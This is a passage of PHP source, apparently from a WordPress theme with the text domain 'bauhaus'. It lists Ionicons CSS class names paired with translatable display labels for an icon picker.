		array( " icon ion-ios-flask" => esc_html__( "ios flask", "bauhaus" ) ),
		array( " icon ion-ios-flask-outline" => esc_html__( "ios flask outline", "bauhaus" ) ),
		array( " icon ion-ios-flower" => esc_html__( "ios flower", "bauhaus" ) ),
		array( " icon ion-ios-flower-outline" => esc_html__( "ios flower outline", "bauhaus" ) ),
		array( " icon ion-ios-folder" => esc_html__( "ios folder", "bauhaus" ) ),
		array( " icon ion-ios-folder-outline" => esc_html__( "ios folder outline", "bauhaus" ) ),
		array( " icon ion-ios-football" => esc_html__( "ios football", "bauhaus" ) ),
		array( " icon ion-ios-football-outline" => esc_html__( "ios football outline", "bauhaus" ) ),
		array( " icon ion-ios-game-controller-a" => esc_html__( "ios game controller a", "bauhaus" ) ),
		array( " icon ion-ios-game-controller-a-outline" => esc_html__( "ios game controller a outline", "bauhaus" ) ),
		array( " icon ion-ios-game-controller-b" => esc_html__( "ios game controller b", "bauhaus" ) ),
		array( " icon ion-ios-game-controller-b-outline" => esc_html__( "ios game controller b outline", "bauhaus" ) ),
		array( " icon ion-ios-gear" => esc_html__( "ios gear", "bauhaus" ) ),
		array( " icon ion-ios-gear-outline" => esc_html__( "ios gear outline", "bauhaus" ) ),
		array( " icon ion-ios-glasses" => esc_html__( "ios glasses", "bauhaus" ) ),
		array( " icon ion-ios-glasses-outline" => esc_html__( "ios glasses outline", "bauhaus" ) ),
		array( " icon ion-ios-grid-view" => esc_html__( "ios grid view", "bauhaus" ) ),
		array( " icon ion-ios-grid-view-outline" => esc_html__( "ios grid view outline", "bauhaus" ) ),
		array( " icon ion-ios-heart" => esc_html__( "ios heart", "bauhaus" ) ),
		array( " icon ion-ios-heart-outline" => esc_html__( "ios heart outline", "bauhaus" ) ),
		array( " icon ion-ios-help" => esc_html__( "ios help", "bauhaus" ) ),
		array( " icon ion-ios-help-empty" => esc_html__( "ios help empty", "bauhaus" ) ),
		array( " icon ion-ios-help-outline" => esc_html__( "ios help outline", "bauhaus" ) ),
		array( " icon ion-ios-home" => esc_html__( "ios home", "bauhaus" ) ),
		array( " icon ion-ios-home-outline" => esc_html__( "ios home outline", "bauhaus" ) ),
		array( " icon ion-ios-infinite" => esc_html__( "ios infinite", "bauhaus" ) ),
		array( " icon ion-ios-infinite-outline" => esc_html__( "ios infinite outline", "bauhaus" ) ),
		array( " icon ion-ios-information" => esc_html__( "ios information", "bauhaus" ) ),
		array( " icon ion-ios-information-empty" => esc_html__( "ios information empty", "bauhaus" ) ),
		array( " icon ion-ios-information-outline" => esc_html__( "ios information outline", "bauhaus" ) ),
		array( " icon ion-ios-ionic-outline" => esc_html__( "ios ionic outline", "bauhaus" ) ),
		array( " icon ion-ios-keypad" => esc_html__( "ios keypad", "bauhaus" ) ),
		array( " icon ion-ios-keypad-outline" => esc_html__( "ios keypad outline", "bauhaus" ) ),
		array( " icon ion-ios-lightbulb" => esc_html__( "ios lightbulb", "bauhaus" ) ),
		array( " icon ion-ios-lightbulb-outline" => esc_html__( "ios lightbulb outline", "bauhaus" ) ),
		array( " icon ion-ios-list" => esc_html__( "ios list", "bauhaus" ) ),
		array( " icon ion-ios-list-outline" => esc_html__( "ios list outline", "bauhaus" ) ),
		array( " icon ion-ios-location" => esc_html__( "ios location", "bauhaus" ) ),
		array( " icon ion-ios-location-outline" => esc_html__( "ios location outline", "bauhaus" ) ),
		array( " icon ion-ios-locked" => esc_html__( "ios locked", "bauhaus" ) ),
		array( " icon ion-ios-locked-outline" => esc_html__( "ios locked outline", "bauhaus" ) ),
		array( " icon ion-ios-loop" => esc_html__( "ios loop", "bauhaus" ) ),
		array( " icon ion-ios-loop-strong" => esc_html__( "ios loop strong", "bauhaus" ) ),
		array( " icon ion-ios-medical" => esc_html__( "ios medical", "bauhaus" ) ),
		array( " icon ion-ios-medical-outline" => esc_html__( "ios medical outline", "bauhaus" ) ),
		array( " icon ion-ios-medkit" => esc_html__( "ios medkit", "bauhaus" ) ),
		array( " icon ion-ios-medkit-outline" => esc_html__( "ios medkit outline", "bauhaus" ) ),
		array( " icon ion-ios-mic" => esc_html__( "ios mic", "bauhaus" ) ),
		array( " icon ion-ios-mic-off" => esc_html__( "ios mic off", "bauhaus" ) ),
		array( " icon ion-ios-mic-outline" => esc_html__( "ios mic outline", "bauhaus" ) ),
		array( " icon ion-ios-minus" => esc_html__( "ios minus", "bauhaus" ) ),
		array( " icon ion-ios-minus-empty" => esc_html__( "ios minus empty", "bauhaus" ) ),
		array( " icon ion-ios-minus-outline" => esc_html__( "ios minus outline", "bauhaus" ) ),
		array( " icon ion-ios-monitor" => esc_html__( "ios monitor", "bauhaus" ) ),
		array( " icon ion-ios-monitor-outline" => esc_html__( "ios monitor outline", "bauhaus" ) ),
		array( " icon ion-ios-moon" => esc_html__( "ios moon", "bauhaus" ) ),
		array( " icon ion-ios-moon-outline" => esc_html__( "ios moon outline", "bauhaus" ) ),
		array( " icon ion-ios-more" => esc_html__( "ios more", "bauhaus" ) ),
		array( " icon ion-ios-more-outline" => esc_html__( "ios more outline", "bauhaus" ) ),
		array( " icon ion-ios-musical-note" => esc_html__( "ios musical note", "bauhaus" ) ),
		array( " icon ion-ios-musical-notes" => esc_html__( "ios musical notes", "bauhaus" ) ),
		array( " icon ion-ios-navigate" => esc_html__( "ios navigate", "bauhaus" ) ),
		array( " icon ion-ios-navigate-outline" => esc_html__( "ios navigate outline", "bauhaus" ) ),
		array( " icon ion-ios-nutrition" => esc_html__( "ios nutrition", "bauhaus" ) ),
		array( " icon ion-ios-nutrition-outline" => esc_html__( "ios nutrition outline", "bauhaus" ) ),
		array( " icon ion-ios-paper" => esc_html__( "ios paper", "bauhaus" ) ),
		array( " icon ion-ios-paper-outline" => esc_html__( "ios paper outline", "bauhaus" ) ),
		array( " icon ion-ios-paperplane" => esc_html__( "ios paperplane", "bauhaus" ) ),
		array( " icon ion-ios-paperplane-outline" => esc_html__( "ios paperplane outline", "bauhaus" ) ),
		array( " icon ion-ios-partlysunny" => esc_html__( "ios partlysunny", "bauhaus" ) ),
		array( " icon ion-ios-partlysunny-outline" => esc_html__( "ios partlysunny outline", "bauhaus" ) ),
		array( " icon ion-ios-pause" => esc_html__( "ios pause", "bauhaus" ) ),
		array( " icon ion-ios-pause-outline" => esc_html__( "ios pause outline", "bauhaus" ) ),
		array( " icon ion-ios-paw" => esc_html__( "ios paw", "bauhaus" ) ),
		array( " icon ion-ios-paw-outline" => esc_html__( "ios paw outline", "bauhaus" ) ),
		array( " icon ion-ios-people" => esc_html__( "ios people", "bauhaus" ) ),
		array( " icon ion-ios-people-outline" => esc_html__( "ios people outline", "bauhaus" ) ),
		array( " icon ion-ios-person" => esc_html__( "ios person", "bauhaus" ) ),
		array( " icon ion-ios-person-outline" => esc_html__( "ios person outline", "bauhaus" ) ),
		array( " icon ion-ios-personadd" => esc_html__( "ios personadd", "bauhaus" ) ),
		array( " icon ion-ios-personadd-outline" => esc_html__( "ios personadd outline", "bauhaus" ) ),
		array( " icon ion-ios-photos" => esc_html__( "ios photos", "bauhaus" ) ),
		array( " icon ion-ios-photos-outline" => esc_html__( "ios photos outline", "bauhaus" ) ),
		array( " icon ion-ios-pie" => esc_html__( "ios pie", "bauhaus" ) ),
		array( " icon ion-ios-pie-outline" => esc_html__( "ios pie outline", "bauhaus" ) ),
		array( " icon ion-ios-pint" => esc_html__( "ios pint", "bauhaus" ) ),
		array( " icon ion-ios-pint-outline" => esc_html__( "ios pint outline", "bauhaus" ) ),
		array( " icon ion-ios-play" => esc_html__( "ios play", "bauhaus" ) ),
		array( " icon ion-ios-play-outline" => esc_html__( "ios play outline", "bauhaus" ) ),
		array( " icon ion-ios-plus" => esc_html__( "ios plus", "bauhaus" ) ),
		array( " icon ion-ios-plus-empty" => esc_html__( "ios plus empty", "bauhaus" ) ),
		array( " icon ion-ios-plus-outline" => esc_html__( "ios plus outline", "bauhaus" ) ),
		array( " icon ion-ios-pricetag" => esc_html__( "ios pricetag", "bauhaus" ) ),
		array( " icon ion-ios-pricetag-outline" => esc_html__( "ios pricetag outline", "bauhaus" ) ),
		array( " icon ion-ios-pricetags" => esc_html__( "ios pricetags", "bauhaus" ) ),
		array( " icon ion-ios-pricetags-outline" => esc_html__( "ios pricetags outline", "bauhaus" ) ),
		array( " icon ion-ios-printer" => esc_html__( "ios printer", "bauhaus" ) ),
		array( " icon ion-ios-printer-outline" => esc_html__( "ios printer outline", "bauhaus" ) ),
		array( " icon ion-ios-pulse" => esc_html__( "ios pulse", "bauhaus" ) ),
		array( " icon ion-ios-pulse-strong" => esc_html__( "ios pulse strong", "bauhaus" ) ),
		array( " icon ion-ios-rainy" => esc_html__( "ios rainy", "bauhaus" ) ),
		array( " icon ion-ios-rainy-outline" => esc_html__( "ios rainy outline", "bauhaus" ) ),
		array( " icon ion-ios-recording" => esc_html__( "ios recording", "bauhaus" ) ),
		array( " icon ion-ios-recording-outline" => esc_html__( "ios recording outline", "bauhaus" ) ),
		array( " icon ion-ios-redo" => esc_html__( "ios redo", "bauhaus" ) ),
		array( " icon ion-ios-redo-outline" => esc_html__( "ios redo outline", "bauhaus" ) ),
		array( " icon ion-ios-refresh" => esc_html__( "ios refresh", "bauhaus" ) ),
		array( " icon ion-ios-refresh-empty" => esc_html__( "ios refresh empty", "bauhaus" ) ),
		array( " icon ion-ios-refresh-outline" => esc_html__( "ios refresh outline", "bauhaus" ) ),
		array( " icon ion-ios-reload" => esc_html__( "ios reload", "bauhaus" ) ),
		array( " icon ion-ios-reverse-camera" => esc_html__( "ios reverse camera", "bauhaus" ) ),
		array( " icon ion-ios-reverse-camera-outline" => esc_html__( "ios reverse camera outline", "bauhaus" ) ),
		array( " icon ion-ios-rewind" => esc_html__( "ios rewind", "bauhaus" ) ),
		array( " icon ion-ios-rewind-outline" => esc_html__( "ios rewind outline", "bauhaus" ) ),
		array( " icon ion-ios-rose" => esc_html__( "ios rose", "bauhaus" ) ),
		array( " icon ion-ios-rose-outline" => esc_html__( "ios rose outline", "bauhaus" ) ),
		array( " icon ion-ios-search" => esc_html__( "ios search", "bauhaus" ) ),
		array( " icon ion-ios-search-strong" => esc_html__( "ios search strong", "bauhaus" ) ),
		array( " icon ion-ios-settings" => esc_html__( "ios settings", "bauhaus" ) ),
		array( " icon ion-ios-settings-strong" => esc_html__( "ios settings strong", "bauhaus" ) ),
		array( " icon ion-ios-shuffle" => esc_html__( "ios shuffle", "bauhaus" ) ),
		array( " icon ion-ios-shuffle-strong" => esc_html__( "ios shuffle strong", "bauhaus" ) ),
		array( " icon ion-ios-skipbackward" => esc_html__( "ios skipbackward", "bauhaus" ) ),
		array( " icon ion-ios-skipbackward-outline" => esc_html__( "ios skipbackward outline", "bauhaus" ) ),
		array( " icon ion-ios-skipforward" => esc_html__( "ios skipforward", "bauhaus" ) ),
		array( " icon ion-ios-skipforward-outline" => esc_html__( "ios skipforward outline", "bauhaus" ) ),
		array( " icon ion-ios-snowy" => esc_html__( "ios snowy", "bauhaus" ) ),
		array( " icon ion-ios-speedometer" => esc_html__( "ios speedometer", "bauhaus" ) ),
		array( " icon ion-ios-speedometer-outline" => esc_html__( "ios speedometer outline", "bauhaus" ) ),
		array( " icon ion-ios-star" => esc_html__( "ios star", "bauhaus" ) ),
		array( " icon ion-ios-star-half" => esc_html__( "ios star half", "bauhaus" ) ),
		array( " icon ion-ios-star-outline" => esc_html__( "ios star outline", "bauhaus" ) ),
		array( " icon ion-ios-stopwatch" => esc_html__( "ios stopwatch", "bauhaus" ) ),
		array( " icon ion-ios-stopwatch-outline" => esc_html__( "ios stopwatch outline", "bauhaus" ) ),
		array( " icon ion-ios-sunny" => esc_html__( "ios sunny", "bauhaus" ) ),
		array( " icon ion-ios-sunny-outline" => esc_html__( "ios sunny outline", "bauhaus" ) ),
		array( " icon ion-ios-telephone" => esc_html__( "ios telephone", "bauhaus" ) ),
		array( " icon ion-ios-telephone-outline" => esc_html__( "ios telephone outline", "bauhaus" ) ),
		array( " icon ion-ios-tennisball" => esc_html__( "ios tennisball", "bauhaus" ) ),
		array( " icon ion-ios-tennisball-outline" => esc_html__( "ios tennisball outline", "bauhaus" ) ),
		array( " icon ion-ios-thunderstorm" => esc_html__( "ios thunderstorm", "bauhaus" ) ),
		array( " icon ion-ios-thunderstorm-outline" => esc_html__( "ios thunderstorm outline", "bauhaus" ) ),
		array( " icon ion-ios-time" => esc_html__( "ios time", "bauhaus" ) ),
		array( " icon ion-ios-time-outline" => esc_html__( "ios time outline", "bauhaus" ) ),
		array( " icon ion-ios-timer" => esc_html__( "ios timer", "bauhaus" ) ),
		array( " icon ion-ios-timer-outline" => esc_html__( "ios timer outline", "bauhaus" ) ),
		array( " icon ion-ios-toggle" => esc_html__( "ios toggle", "bauhaus" ) ),
		array( " icon ion-ios-toggle-outline" => esc_html__( "ios toggle outline", "bauhaus" ) ),
		array( " icon ion-ios-trash" => esc_html__( "ios trash", "bauhaus" ) ),
		array( " icon ion-ios-trash-outline" => esc_html__( "ios trash outline", "bauhaus" ) ),
		array( " icon ion-ios-undo" => esc_html__( "ios undo", "bauhaus" ) ),
		array( " icon ion-ios-undo-outline" => esc_html__( "ios undo outline", "bauhaus" ) ),
		array( " icon ion-ios-unlocked" => esc_html__( "ios unlocked", "bauhaus" ) ),
		array( " icon ion-ios-unlocked-outline" => esc_html__( "ios unlocked outline", "bauhaus" ) ),
		array( " icon ion-ios-upload" => esc_html__( "ios upload", "bauhaus" ) ),
		array( " icon ion-ios-upload-outline" => esc_html__( "ios upload outline", "bauhaus" ) ),
		array( " icon ion-ios-videocam" => esc_html__( "ios videocam", "bauhaus" ) ),
		array( " icon ion-ios-videocam-outline" => esc_html__( "ios videocam outline", "bauhaus" ) ),
		array( " icon ion-ios-volume-high" => esc_html__( "ios volume high", "bauhaus" ) ),
		array( " icon ion-ios-volume-low" => esc_html__( "ios volume low", "bauhaus" ) ),
		array( " icon ion-ios-wineglass" => esc_html__( "ios wineglass", "bauhaus" ) ),
		array( " icon ion-ios-wineglass-outline" => esc_html__( "ios wineglass outline", "bauhaus" ) ),
		array( " icon ion-ios-world" => esc_html__( "ios world", "bauhaus" ) ),
		array( " icon ion-ios-world-outline" => esc_html__( "ios world outline", "bauhaus" ) ),
		array( " icon ion-ipad" => esc_html__( "ipad", "bauhaus" ) ),
		array( " icon ion-iphone" => esc_html__( "iphone", "bauhaus" ) ),
		array( " icon ion-ipod" => esc_html__( "ipod", "bauhaus" ) ),
		array( " icon ion-jet" => esc_html__( "jet", "bauhaus" ) ),
		array( " icon ion-key" => esc_html__( "key", "bauhaus" ) ),
		array( " icon ion-knife" => esc_html__( "knife", "bauhaus" ) ),
		array( " icon ion-laptop" => esc_html__( "laptop", "bauhaus" ) ),
		array( " icon ion-leaf" => esc_html__( "leaf", "bauhaus" ) ),
		array( " icon ion-levels" => esc_html__( "levels", "bauhaus" ) ),
		array( " icon ion-lightbulb" => esc_html__( "lightbulb", "bauhaus" ) ),
		array( " icon ion-link" => esc_html__( "link", "bauhaus" ) ),
		array( " icon ion-load-a" => esc_html__( "load a", "bauhaus" ) ),
		array( " icon ion-load-b" => esc_html__( "load b", "bauhaus" ) ),
		array( " icon ion-load-c" => esc_html__( "load c", "bauhaus" ) ),
		array( " icon ion-load-d" => esc_html__( "load d", "bauhaus" ) ),
		array( " icon ion-location" => esc_html__( "location", "bauhaus" ) ),
		array( " icon ion-lock-combination" => esc_html__( "lock combination", "bauhaus" ) ),
		array( " icon ion-locked" => esc_html__( "locked", "bauhaus" ) ),
		array( " icon ion-log-in" => esc_html__( "log in", "bauhaus" ) ),
		array( " icon ion-log-out" => esc_html__( "log out", "bauhaus" ) ),
		array( " icon ion-loop" => esc_html__( "loop", "bauhaus" ) ),
		array( " icon ion-magnet" => esc_html__( "magnet", "bauhaus" ) ),
		array( " icon ion-male" => esc_html__( "male", "bauhaus" ) ),
		array( " icon ion-man" => esc_html__( "man", "bauhaus" ) ),
		array( " icon ion-map" => esc_html__( "map", "bauhaus" ) ),
		array( " icon ion-medkit" => esc_html__( "medkit", "bauhaus" ) ),
		array( " icon ion-merge" => esc_html__( "merge", "bauhaus" ) ),
		array( " icon ion-mic-a" => esc_html__( "mic a", "bauhaus" ) ),
		array( " icon ion-mic-b" => esc_html__( "mic b", "bauhaus" ) ),
		array( " icon ion-mic-c" => esc_html__( "mic c", "bauhaus" ) ),
		array( " icon ion-minus" => esc_html__( "minus", "bauhaus" ) ),
		array( " icon ion-minus-circled" => esc_html__( "minus circled", "bauhaus" ) ),
		array( " icon ion-minus-round" => esc_html__( "minus round", "bauhaus" ) ),
		array( " icon ion-model-s" => esc_html__( "model s", "bauhaus" ) ),
		array( " icon ion-monitor" => esc_html__( "monitor", "bauhaus" ) ),
		array( " icon ion-more" => esc_html__( "more", "bauhaus" ) ),
		array( " icon ion-mouse" => esc_html__( "mouse", "bauhaus" ) ),
		array( " icon ion-music-note" => esc_html__( "music note", "bauhaus" ) ),
		array( " icon ion-navicon" => esc_html__( "navicon", "bauhaus" ) ),
		array( " icon ion-navicon-round" => esc_html__( "navicon round", "bauhaus" ) ),
		array( " icon ion-navigate" => esc_html__( "navigate", "bauhaus" ) ),
		array( " icon ion-network" => esc_html__( "network", "bauhaus" ) ),
		array( " icon ion-no-smoking" => esc_html__( "no smoking", "bauhaus" ) ),
		array( " icon ion-nuclear" => esc_html__( "nuclear", "bauhaus" ) ),
		array( " icon ion-outlet" => esc_html__( "outlet", "bauhaus" ) ),
		array( " icon ion-paintbrush" => esc_html__( "paintbrush", "bauhaus" ) ),
		array( " icon ion-paintbucket" => esc_html__( "paintbucket", "bauhaus" ) ),
		array( " icon ion-paper-airplane" => esc_html__( "paper airplane", "bauhaus" ) ),
		array( " icon ion-paperclip" => esc_html__( "paperclip", "bauhaus" ) ),
		array( " icon ion-pause" => esc_html__( "pause", "bauhaus" ) ),
		array( " icon ion-person" => esc_html__( "person", "bauhaus" ) ),
		array( " icon ion-person-add" => esc_html__( "person add", "bauhaus" ) ),
		array( " icon ion-person-stalker" => esc_html__( "person stalker", "bauhaus" ) ),
		array( " icon ion-pie-graph" => esc_html__( "pie graph", "bauhaus" ) ),
		array( " icon ion-pin" => esc_html__( "pin", "bauhaus" ) ),
		array( " icon ion-pinpoint" => esc_html__( "pinpoint", "bauhaus" ) ),
		array( " icon ion-pizza" => esc_html__( "pizza", "bauhaus" ) ),
		array( " icon ion-plane" => esc_html__( "plane", "bauhaus" ) ),
		array( " icon ion-planet" => esc_html__( "planet", "bauhaus" ) ),
		array( " icon ion-play" => esc_html__( "play", "bauhaus" ) ),
		array( " icon ion-playstation" => esc_html__( "playstation", "bauhaus" ) ),
		array( " icon ion-plus" => esc_html__( "plus", "bauhaus" ) ),
		array( " icon ion-plus-circled" => esc_html__( "plus circled", "bauhaus" ) ),
		array( " icon ion-plus-round" => esc_html__( "plus round", "bauhaus" ) ),
		array( " icon ion-podium" => esc_html__( "podium", "bauhaus" ) ),
		array( " icon ion-pound" => esc_html__( "pound", "bauhaus" ) ),
		array( " icon ion-power" => esc_html__( "power", "bauhaus" ) ),
		array( " icon ion-pricetag" => esc_html__( "pricetag", "bauhaus" ) ),
		array( " icon ion-pricetags" => esc_html__( "pricetags", "bauhaus" ) ),
		array( " icon ion-printer" => esc_html__( "printer", "bauhaus" ) ),
		array( " icon ion-pull-request" => esc_html__( "pull request", "bauhaus" ) ),
		array( " icon ion-qr-scanner" => esc_html__( "qr scanner", "bauhaus" ) ),
		array( " icon ion-quote" => esc_html__( "quote", "bauhaus" ) ),
		array( " icon ion-radio-waves" => esc_html__( "radio waves", "bauhaus" ) ),
		array( " icon ion-record" => esc_html__( "record", "bauhaus" ) ),
		array( " icon ion-refresh" => esc_html__( "refresh", "bauhaus" ) ),
		array( " icon ion-reply" => esc_html__( "reply", "bauhaus" ) ),
		array( " icon ion-reply-all" => esc_html__( "reply all", "bauhaus" ) ),
		array( " icon ion-ribbon-a" => esc_html__( "ribbon a", "bauhaus" ) ),
		array( " icon ion-ribbon-b" => esc_html__( "ribbon b", "bauhaus" ) ),
		array( " icon ion-sad" => esc_html__( "sad", "bauhaus" ) ),
		array( " icon ion-sad-outline" => esc_html__( "sad outline", "bauhaus" ) ),
		array( " icon ion-scissors" => esc_html__( "scissors", "bauhaus" ) ),
		array( " icon ion-search" => esc_html__( "search", "bauhaus" ) ),
		array( " icon ion-settings" => esc_html__( "settings", "bauhaus" ) ),
		array( " icon ion-share" => esc_html__( "share", "bauhaus" ) ),
		array( " icon ion-shuffle" => esc_html__( "shuffle", "bauhaus" ) ),
		array( " icon ion-skip-backward" => esc_html__( "skip backward", "bauhaus" ) ),
		array( " icon ion-skip-forward" => esc_html__( "skip forward", "bauhaus" ) ),
		array( " icon ion-social-android" => esc_html__( "social android", "bauhaus" ) ),
		array( " icon ion-social-android-outline" => esc_html__( "social android outline", "bauhaus" ) ),
		array( " icon ion-social-angular" => esc_html__( "social angular", "bauhaus" ) ),
		array( " icon ion-social-angular-outline" => esc_html__( "social angular outline", "bauhaus" ) ),
		array( " icon ion-social-apple" => esc_html__( "social apple", "bauhaus" ) ),
		array( " icon ion-social-apple-outline" => esc_html__( "social apple outline", "bauhaus" ) ),
		array( " icon ion-social-bitcoin" => esc_html__( "social bitcoin", "bauhaus" ) ),
		array( " icon ion-social-bitcoin-outline" => esc_html__( "social bitcoin outline", "bauhaus" ) ),
		array( " icon ion-social-buffer" => esc_html__( "social buffer", "bauhaus" ) ),
		array( " icon ion-social-buffer-outline" => esc_html__( "social buffer outline", "bauhaus" ) ),
		array( " icon ion-social-chrome" => esc_html__( "social chrome", "bauhaus" ) ),
		array( " icon ion-social-chrome-outline" => esc_html__( "social chrome outline", "bauhaus" ) ),
		array( " icon ion-social-codepen" => esc_html__( "social codepen", "bauhaus" ) ),
		array( " icon ion-social-codepen-outline" => esc_html__( "social codepen outline", "bauhaus" ) ),
		array( " icon ion-social-css3" => esc_html__( "social css3", "bauhaus" ) ),
		array( " icon ion-social-css3-outline" => esc_html__( "social css3 outline", "bauhaus" ) ),
		array( " icon ion-social-designernews" => esc_html__( "social designernews", "bauhaus" ) ),
		array( " icon ion-social-designernews-outline" => esc_html__( "social designernews outline", "bauhaus" ) ),
		array( " icon ion-social-dribbble" => esc_html__( "social dribbble", "bauhaus" ) ),
		array( " icon ion-social-dribbble-outline" => esc_html__( "social dribbble outline", "bauhaus" ) ),
		array( " icon ion-social-dropbox" => esc_html__( "social dropbox", "bauhaus" ) ),
		array( " icon ion-social-dropbox-outline" => esc_html__( "social dropbox outline", "bauhaus" ) ),
		array( " icon ion-social-euro" => esc_html__( "social euro", "bauhaus" ) ),
		array( " icon ion-social-euro-outline" => esc_html__( "social euro outline", "bauhaus" ) ),
		array( " icon ion-social-facebook" => esc_html__( "social facebook", "bauhaus" ) ),
		array( " icon ion-social-facebook-outline" => esc_html__( "social facebook outline", "bauhaus" ) ),
		array( " icon ion-social-foursquare" => esc_html__( "social foursquare", "bauhaus" ) ),
		array( " icon ion-social-foursquare-outline" => esc_html__( "social foursquare outline", "bauhaus" ) ),
		array( " icon ion-social-freebsd-devil" => esc_html__( "social freebsd devil", "bauhaus" ) ),
		array( " icon ion-social-github" => esc_html__( "social github", "bauhaus" ) ),
		array( " icon ion-social-github-outline" => esc_html__( "social github outline", "bauhaus" ) ),
		array( " icon ion-social-google" => esc_html__( "social google", "bauhaus" ) ),
		array( " icon ion-social-google-outline" => esc_html__( "social google outline", "bauhaus" ) ),
		array( " icon ion-social-googleplus" => esc_html__( "social googleplus", "bauhaus" ) ),
		array( " icon ion-social-googleplus-outline" => esc_html__( "social googleplus outline", "bauhaus" ) ),
		array( " icon ion-social-hackernews" => esc_html__( "social hackernews", "bauhaus" ) ),
		array( " icon ion-social-hackernews-outline" => esc_html__( "social hackernews outline", "bauhaus" ) ),
		array( " icon ion-social-html5" => esc_html__( "social html5", "bauhaus" ) ),
		array( " icon ion-social-html5-outline" => esc_html__( "social html5 outline", "bauhaus" ) ),
		array( " icon ion-social-instagram" => esc_html__( "social instagram", "bauhaus" ) ),
		array( " icon ion-social-instagram-outline" => esc_html__( "social instagram outline", "bauhaus" ) ),
		array( " icon ion-social-javascript" => esc_html__( "social javascript", "bauhaus" ) ),
		array( " icon ion-social-javascript-outline" => esc_html__( "social javascript outline", "bauhaus" ) ),
		array( " icon ion-social-linkedin" => esc_html__( "social linkedin", "bauhaus" ) ),
		array( " icon ion-social-linkedin-outline" => esc_html__( "social linkedin outline", "bauhaus" ) ),
		array( " icon ion-social-markdown" => esc_html__( "social markdown", "bauhaus" ) ),
		array( " icon ion-social-nodejs" => esc_html__( "social nodejs", "bauhaus" ) ),
		array( " icon ion-social-octocat" => esc_html__( "social octocat", "bauhaus" ) ),
		array( " icon ion-social-pinterest" => esc_html__( "social pinterest", "bauhaus" ) ),
		array( " icon ion-social-pinterest-outline" => esc_html__( "social pinterest outline", "bauhaus" ) ),
		array( " icon ion-social-python" => esc_html__( "social python", "bauhaus" ) ),
		array( " icon ion-social-reddit" => esc_html__( "social reddit", "bauhaus" ) ),
		array( " icon ion-social-reddit-outline" => esc_html__( "social reddit outline", "bauhaus" ) ),
		array( " icon ion-social-rss" => esc_html__( "social rss", "bauhaus" ) ),
		array( " icon ion-social-rss-outline" => esc_html__( "social rss outline", "bauhaus" ) ),
		array( " icon ion-social-sass" => esc_html__( "social sass", "bauhaus" ) ),
		array( " icon ion-social-skype" => esc_html__( "social skype", "bauhaus" ) ),
		array( " icon ion-social-skype-outline" => esc_html__( "social skype outline", "bauhaus" ) ),
		array( " icon ion-social-snapchat" => esc_html__( "social snapchat", "bauhaus" ) ),
		array( " icon ion-social-snapchat-outline" => esc_html__( "social snapchat outline", "bauhaus" ) ),
		array( " icon ion-social-tumblr" => esc_html__( "social tumblr", "bauhaus" ) ),
		array( " icon ion-social-tumblr-outline" => esc_html__( "social tumblr outline", "bauhaus" ) ),
		array( " icon ion-social-tux" => esc_html__( "social tux", "bauhaus" ) ),
		array( " icon ion-social-twitch" => esc_html__( "social twitch", "bauhaus" ) ),
		array( " icon ion-social-twitch-outline" => esc_html__( "social twitch outline", "bauhaus" ) ),
		array( " icon ion-social-twitter" => esc_html__( "social twitter", "bauhaus" ) ),
		array( " icon ion-social-twitter-outline" => esc_html__( "social twitter outline", "bauhaus" ) ),
		array( " icon ion-social-usd" => esc_html__( "social usd", "bauhaus" ) ),
		array( " icon ion-social-usd-outline" => esc_html__( "social usd outline", "bauhaus" ) ),
		array( " icon ion-social-vimeo" => esc_html__( "social vimeo", "bauhaus" ) ),
		array( " icon ion-social-vimeo-outline" => esc_html__( "social vimeo outline", "bauhaus" ) ),
		array( " icon ion-social-whatsapp" => esc_html__( "social whatsapp", "bauhaus" ) ),
		array( " icon ion-social-whatsapp-outline" => esc_html__( "social whatsapp outline", "bauhaus" ) ),
		array( " icon ion-social-windows" => esc_html__( "social windows", "bauhaus" ) ),
		array( " icon ion-social-windows-outline" => esc_html__( "social windows outline", "bauhaus" ) ),
		array( " icon ion-social-wordpress" => esc_html__( "social wordpress", "bauhaus" ) ),
		array( " icon ion-social-wordpress-outline" => esc_html__( "social wordpress outline", "bauhaus" ) ),
		array( " icon ion-social-yahoo" => esc_html__( "social yahoo", "bauhaus" ) ),
		array( " icon ion-social-yahoo-outline" => esc_html__( "social yahoo outline", "bauhaus" ) ),
		array( " icon ion-social-yen" => esc_html__( "social yen", "bauhaus" ) ),
		array( " icon ion-social-yen-outline" => esc_html__( "social yen outline", "bauhaus" ) ),
		array( " icon ion-social-youtube" => esc_html__( "social youtube", "bauhaus" ) ),
		array( " icon ion-social-youtube-outline" => esc_html__( "social youtube outline", "bauhaus" ) ),
		array( " icon ion-soup-can" => esc_html__( "soup can", "bauhaus" ) ),
		array( " icon ion-soup-can-outline" => esc_html__( "soup can outline", "bauhaus" ) ),
		array( " icon ion-speakerphone" => esc_html__( "speakerphone", "bauhaus" ) ),
		array( " icon ion-speedometer" => esc_html__( "speedometer", "bauhaus" ) ),
		array( " icon ion-spoon" => esc_html__( "spoon", "bauhaus" ) ),
		array( " icon ion-star" => esc_html__( "star", "bauhaus" ) ),
		array( " icon ion-stats-bars" => esc_html__( "stats bars", "bauhaus" ) ),
		array( " icon ion-steam" => esc_html__( "steam", "bauhaus" ) ),
		array( " icon ion-stop" => esc_html__( "stop", "bauhaus" ) ),
		array( " icon ion-thermometer" => esc_html__( "thermometer", "bauhaus" ) ),
		array( " icon ion-thumbsdown" => esc_html__( "thumbsdown", "bauhaus" ) ),
		array( " icon ion-thumbsup" => esc_html__( "thumbsup", "bauhaus" ) ),
		array( " icon ion-toggle" => esc_html__( "toggle", "bauhaus" ) ),
		array( " icon ion-toggle-filled" => esc_html__( "toggle filled", "bauhaus" ) ),
		array( " icon ion-transgender" => esc_html__( "transgender", "bauhaus" ) ),
		array( " icon ion-trash-a" => esc_html__( "trash a", "bauhaus" ) ),
		array( " icon ion-trash-b" => esc_html__( "trash b", "bauhaus" ) ),
		array( " icon ion-trophy" => esc_html__( "trophy", "bauhaus" ) ),
		array( " icon ion-tshirt" => esc_html__( "tshirt", "bauhaus" ) ),
		array( " icon ion-tshirt-outline" => esc_html__( "tshirt outline", "bauhaus" ) ),
		array( " icon ion-umbrella" => esc_html__( "umbrella", "bauhaus" ) ),
		array( " icon ion-university" => esc_html__( "university", "bauhaus" ) ),
		array( " icon ion-unlocked" => esc_html__( "unlocked", "bauhaus" ) ),
		array( " icon ion-upload" => esc_html__( "upload", "bauhaus" ) ),
		array( " icon ion-usb" => esc_html__( "usb", "bauhaus" ) ),
		array( " icon ion-videocamera" => esc_html__( "videocamera", "bauhaus" ) ),
		array( " icon ion-volume-high" => esc_html__( "volume high", "bauhaus" ) ),
